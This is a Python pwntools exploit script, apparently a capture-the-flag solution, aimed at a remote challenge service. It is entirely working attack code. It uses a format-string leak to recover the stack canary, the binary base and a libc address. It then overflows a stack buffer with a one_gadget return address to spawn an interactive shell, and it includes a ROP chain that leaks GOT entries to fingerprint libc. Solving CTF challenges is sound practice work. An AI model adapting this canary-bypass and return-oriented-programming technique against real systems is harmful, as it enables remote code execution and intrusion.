#!/usr/bin/python3

from pwn import *

def start_conn():
	p = remote('blackhat2-51ebed93bf7c2f73148968c116264508-0.chals.bh.ctf.sa', 443, ssl=True, sni='blackhat2-51ebed93bf7c2f73148968c116264508-0.chals.bh.ctf.sa')
	#p = remote('localhost', 1337)
	return p

canary = ""
file_offset = 0
putsgot_offset = 0x3fa8
puts_offset = 0x12e9
reset_offset = 0x1100
poprdi_offset = 0x1373
one_gadget = 0x4f302

def leak(p):
	p.recv()
	p.sendline('%p %13$p %11$p %23$p')
	p.recvuntil('Thank you ')
	leak = p.recvuntil('\n', drop=True)
	leaks = leak.decode('utf8').split(' ')
	p.recv()
	return leaks

def bof_trigger(payday, p):
	payload = b"\x00"*56
	payload += canary
	payload += b"\x00"*8 #rbp
	payload += payday
	p.sendline(payload)
	return

def exp():
	global canary
	global offset
	p = start_conn()
	leaks = leak(p)
	#print(leaks)
	canary = p64(int(leaks[2][2:],16))
	offset = int(leaks[1][2:],16) - 0x12c5
	libc_offset = int(leaks[3][2:],16) - 0x21c87
	print(hex(libc_offset))
	payload = p64(libc_offset + one_gadget)
	bof_trigger(payload, p)
	#chef = u64(chef)
	#print(hex(chef))
	p.interactive()

def leak_libc():
	global canary
	global offset
	libc_leaks = []
	for i in range(10):
		p = start_conn()
		leaks = leak(p)
		canary = p64(int(leaks[2][2:],16))
		offset = int(leaks[1][2:],16) - 0x12c5
		payload = p64(offset + poprdi_offset)
		payload += p64(offset + putsgot_offset + (i*8))
		payload += p64(offset + puts_offset)
		bof_trigger(payload, p)
		p.recvline()
		libc_leak = p.recv(6) + b'\x00\x00'
		if len(libc_leak) == 8:
			libc_leaks.append((i, u64(libc_leak)))
		else:
			print(libc_leak)
		p.close()
	for c in libc_leaks:
		print('{}: {}'.format(c[0], hex(c[1])))


if __name__ == '__main__':
	exp()